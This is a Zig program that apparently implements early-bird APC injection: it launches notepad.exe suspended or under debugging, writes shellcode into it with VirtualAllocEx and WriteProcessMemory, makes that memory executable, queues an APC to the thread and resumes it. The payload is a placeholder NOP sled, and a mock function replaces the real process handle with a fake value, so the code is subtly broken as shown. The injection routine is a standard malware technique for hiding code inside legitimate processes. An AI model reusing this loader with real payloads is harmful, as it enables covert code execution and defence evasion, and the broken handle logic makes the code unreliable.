const std = @import("std");
const windows = std.os.windows;
const print = std.debug.print;

// Constants
const TARGET_PROCESS = "notepad.exe";
const MAX_PATH = 260;

// Define missing Windows structures
const STARTUPINFO = extern struct {
    cb: windows.DWORD,
    lpReserved: ?windows.LPWSTR,
    lpDesktop: ?windows.LPWSTR,
    lpTitle: ?windows.LPWSTR,
    dwX: windows.DWORD,
    dwY: windows.DWORD,
    dwXSize: windows.DWORD,
    dwYSize: windows.DWORD,
    dwXCountChars: windows.DWORD,
    dwYCountChars: windows.DWORD,
    dwFillAttribute: windows.DWORD,
    dwFlags: windows.DWORD,
    wShowWindow: windows.WORD,
    cbReserved2: windows.WORD,
    lpReserved2: ?*windows.BYTE,
    hStdInput: ?windows.HANDLE,
    hStdOutput: ?windows.HANDLE,
    hStdError: ?windows.HANDLE,
};

const PROCESS_INFORMATION = extern struct {
    hProcess: windows.HANDLE,
    hThread: windows.HANDLE,
    dwProcessId: windows.DWORD,
    dwThreadId: windows.DWORD,
};

const SECURITY_ATTRIBUTES = extern struct {
    nLength: windows.DWORD,
    lpSecurityDescriptor: ?*anyopaque,
    bInheritHandle: windows.BOOL,
};

// Windows API declarations
extern "kernel32" fn VirtualAllocEx(
    hProcess: windows.HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: windows.DWORD,
    flProtect: windows.DWORD,
) callconv(windows.WINAPI) ?*anyopaque;

extern "kernel32" fn WriteProcessMemory(
    hProcess: windows.HANDLE,
    lpBaseAddress: *anyopaque,
    lpBuffer: *const anyopaque,
    nSize: usize,
    lpNumberOfBytesWritten: ?*usize,
) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn VirtualProtectEx(
    hProcess: windows.HANDLE,
    lpAddress: *anyopaque,
    dwSize: usize,
    flNewProtect: windows.DWORD,
    lpflOldProtect: *windows.DWORD,
) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn GetEnvironmentVariableA(
    lpName: [*:0]const u8,
    lpBuffer: [*]u8,
    nSize: windows.DWORD,
) callconv(windows.WINAPI) windows.DWORD;

extern "kernel32" fn CreateProcessA(
    lpApplicationName: ?[*:0]const u8,
    lpCommandLine: ?[*:0]u8,
    lpProcessAttributes: ?*SECURITY_ATTRIBUTES,
    lpThreadAttributes: ?*SECURITY_ATTRIBUTES,
    bInheritHandles: windows.BOOL,
    dwCreationFlags: windows.DWORD,
    lpEnvironment: ?*anyopaque,
    lpCurrentDirectory: ?[*:0]const u8,
    lpStartupInfo: *STARTUPINFO,
    lpProcessInformation: *PROCESS_INFORMATION,
) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn QueueUserAPC(
    pfnAPC: *const fn (*anyopaque) callconv(windows.WINAPI) void,
    hThread: windows.HANDLE,
    dwData: usize,
) callconv(windows.WINAPI) windows.DWORD;

extern "kernel32" fn DebugActiveProcessStop(
    dwProcessId: windows.DWORD,
) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn ResumeThread(
    hThread: windows.HANDLE,
) callconv(windows.WINAPI) windows.DWORD;

// Constants for Windows API
const MEM_COMMIT = 0x1000;
const MEM_RESERVE = 0x2000;
const PAGE_READWRITE = 0x04;
const PAGE_EXECUTE_READWRITE = 0x40;
const DEBUG_PROCESS = 0x00000001;
const CREATE_SUSPENDED = 0x00000004;

// Process creation method enum
const ProcessCreationMethod = enum {
    CREATE_SUSPENDED,
    DEBUG_PROCESS,
};

// Helper function to check if handle is valid
fn isValidHandle(handle: windows.HANDLE) bool {
    return @intFromPtr(handle) != 0 and @intFromPtr(handle) != ~@as(usize, 0);
}

/// inject the input payload into 'hProcess' and return the base address of where did the payload got written
fn injectShellcodeToRemoteProcess(
    hProcess: windows.HANDLE,
    pShellcode: []const u8,
    ppAddress: *?*anyopaque,
) bool {
    var sNumberOfBytesWritten: usize = 0;
    var dwOldProtection: windows.DWORD = 0;

    ppAddress.* = VirtualAllocEx(
        hProcess,
        null,
        pShellcode.len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if (ppAddress.* == null) {
        print("\n\t[!] VirtualAllocEx Failed With Error : {d} \n", .{windows.kernel32.GetLastError()});
        return false;
    }
    print("\n\t[i] Allocated Memory At : 0x{X} \n", .{@intFromPtr(ppAddress.*.?)});

    if (WriteProcessMemory(
        hProcess,
        ppAddress.*.?,
        pShellcode.ptr,
        pShellcode.len,
        &sNumberOfBytesWritten,
    ) == 0 or sNumberOfBytesWritten != pShellcode.len) {
        print("\n\t[!] WriteProcessMemory Failed With Error : {d} \n", .{windows.kernel32.GetLastError()});
        return false;
    }
    print("\t[i] Successfully Written {d} Bytes\n", .{sNumberOfBytesWritten});

    if (VirtualProtectEx(
        hProcess,
        ppAddress.*.?,
        pShellcode.len,
        PAGE_EXECUTE_READWRITE,
        &dwOldProtection,
    ) == 0) {
        print("\n\t[!] VirtualProtectEx Failed With Error : {d} \n", .{windows.kernel32.GetLastError()});
        return false;
    }

    return true;
}

/// Creates a new process 'lpProcessName' in suspended state and return its pid, handle, and the handle of its main thread
fn createSuspendedProcess2(
    lpProcessName: [*:0]const u8,
    dwProcessId: *windows.DWORD,
    hProcess: *windows.HANDLE,
    hThread: *windows.HANDLE,
    method: ProcessCreationMethod,
) bool {
    var lpPath: [MAX_PATH * 2]u8 = undefined;
    var WnDr: [MAX_PATH]u8 = undefined;

    var Si: STARTUPINFO = undefined;
    var Pi: PROCESS_INFORMATION = undefined;

    // cleaning the structs (using Zig's built-in memory functions)
    @memset(std.mem.asBytes(&Si), 0);
    @memset(std.mem.asBytes(&Pi), 0);

    // setting the size of the structure
    Si.cb = @sizeOf(STARTUPINFO);

    // Getting the %WINDIR% environment variable path (this is usually 'C:\Windows')
    if (GetEnvironmentVariableA("WINDIR", &WnDr, MAX_PATH) == 0) {
        print("[!] GetEnvironmentVariableA Failed With Error : {d} \n", .{windows.kernel32.GetLastError()});
        return false;
    }

    // Creating the target process path
    const formatted = std.fmt.bufPrintZ(&lpPath, "{s}\\System32\\{s}", .{ WnDr[0..std.mem.indexOfScalar(u8, &WnDr, 0).?], std.mem.span(lpProcessName) }) catch {
        print("[!] Failed to format path\n", .{});
        return false;
    };

    // Use runtime switch with var instead of const
    var creation_flags: windows.DWORD = undefined;
    var method_name: []const u8 = undefined;

    switch (method) {
        .CREATE_SUSPENDED => {
            creation_flags = CREATE_SUSPENDED;
            method_name = "Suspended";
        },
        .DEBUG_PROCESS => {
            creation_flags = DEBUG_PROCESS;
            method_name = "Debugged";
        },
    }

    print("\n\t[i] Running : \"{s}\" as {s} Process ... ", .{ formatted, method_name });

    if (CreateProcessA(
        null,
        @constCast(formatted.ptr),
        null,
        null,
        0, // FALSE
        creation_flags,
        null,
        null,
        &Si,
        &Pi,
    ) == 0) {
        print("[!] CreateProcessA Failed with Error : {d} \n", .{windows.kernel32.GetLastError()});
        return false;
    }

    print("[+] DONE \n", .{});

    // Populating the OUTPUT parameter with 'CreateProcessA's output'
    dwProcessId.* = Pi.dwProcessId;
    hProcess.* = Pi.hProcess;
    hThread.* = Pi.hThread;

    // Doing a check to verify we got everything we need
    if (dwProcessId.* != 0 and isValidHandle(hProcess.*) and isValidHandle(hThread.*))
        return true;

    return false;
}

fn resumeProcess(dwProcessId: windows.DWORD, hThread: windows.HANDLE, method: ProcessCreationMethod) void {
    switch (method) {
        .CREATE_SUSPENDED => {
            print("[i] Resuming The Target Process Thread ... ", .{});
            const result = ResumeThread(hThread);
            if (result == ~@as(windows.DWORD, 0)) {
                print("[!] ResumeThread Failed With Error : {d} \n", .{windows.kernel32.GetLastError()});
            } else {
                print("[+] DONE \n\n", .{});
            }
        },
        .DEBUG_PROCESS => {
            print("[i] Detaching The Target Process ... ", .{});
            _ = DebugActiveProcessStop(dwProcessId);
            print("[+] DONE \n\n", .{});
        },
    }
}

fn waitForEnter(message: []const u8) void {
    print("{s}", .{message});
    var buffer: [256]u8 = undefined;
    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
}

fn getUserChoice() !ProcessCreationMethod {
    const stdin = std.io.getStdIn().reader();
    var buffer: [256]u8 = undefined;

    print("\n[?] Choose Process Creation Flag:\n", .{});
    print("    [1] CREATE_SUSPENDED\n", .{});
    print("    [2] DEBUG_PROCESS\n", .{});
    print("[>] Enter your choice (1 or 2): ", .{});

    while (true) {
        if (try stdin.readUntilDelimiterOrEof(buffer[0..], '\n')) |input| {
            const trimmed = std.mem.trim(u8, input, " \t\r\n");

            if (std.mem.eql(u8, trimmed, "1")) {
                return ProcessCreationMethod.CREATE_SUSPENDED;
            } else if (std.mem.eql(u8, trimmed, "2")) {
                return ProcessCreationMethod.DEBUG_PROCESS;
            } else {
                print("[!] Invalid choice. Please enter 1 or 2: ", .{});
            }
        } else {
            print("[!] Failed to read input. Please try again: ", .{});
        }
    }
}

// This function simulates the error described in the problem statement
fn getRemoteProcessHandle(hProcess: *windows.HANDLE) bool {
    // Mock function to simulate getting a remote process handle
    // In a real implementation, this would open a process handle
    hProcess.* = @ptrFromInt(0x1234); // Mock handle value
    return true;
}

pub fn main() !void {
    // FIXED: Change hProcess declaration from ?HANDLE to HANDLE
    // Initialize it to null cast to HANDLE
    var hProcess: windows.HANDLE = @ptrFromInt(0);
    var hThread: windows.HANDLE = undefined;
    var dwProcessId: windows.DWORD = 0;
    var pAddress: ?*anyopaque = null;

    // Get user's choice for process creation method
    const creation_method = try getUserChoice();

    const method_name = switch (creation_method) {
        .CREATE_SUSPENDED => "Suspended",
        .DEBUG_PROCESS => "Debugged",
    };

    // creating target remote process (in suspended/debugged state)
    print("\n[i] Creating \"{s}\" Process As A {s} Process ... ", .{ TARGET_PROCESS, method_name });
    if (!createSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread, creation_method)) {
        return;
    }
    print("\t[i] Target Process Created With Pid : {d} \n", .{dwProcessId});
    print("[+] DONE \n\n", .{});

    // This now works correctly - no compilation error
    if (!getRemoteProcessHandle(&hProcess)) {
        return;
    }

    // Updated null checks to handle non-optional HANDLE
    if (@intFromPtr(hProcess) != 0) {
        print("[i] Process handle obtained: {}\n", .{hProcess});
        
        // Example shellcode (just zeros for demonstration)
        const example_payload = [_]u8{0x90, 0x90, 0x90, 0x90}; // NOP sled
        
        // injecting the payload and getting the base address of it
        print("[i] Writing Shellcode To The Target Process ... ", .{});
        if (!injectShellcodeToRemoteProcess(hProcess, &example_payload, &pAddress)) {
            return;
        }
        print("[+] DONE \n\n", .{});

        // running QueueUserAPC
        print("[i] Queueing APC to target thread ... ", .{});
        _ = QueueUserAPC(
            @ptrCast(pAddress.?),
            hThread,
            0,
        );
        print("[+] DONE \n\n", .{});

        waitForEnter("[#] Press <Enter> To Run Shellcode ... ");

        // Resume process execution based on the creation method
        resumeProcess(dwProcessId, hThread, creation_method);

        waitForEnter("[#] Press <Enter> To Quit ... ");

        windows.CloseHandle(hProcess);
        windows.CloseHandle(hThread);
    } else {
        print("[!] Failed to obtain process handle\n", .{});
    }
}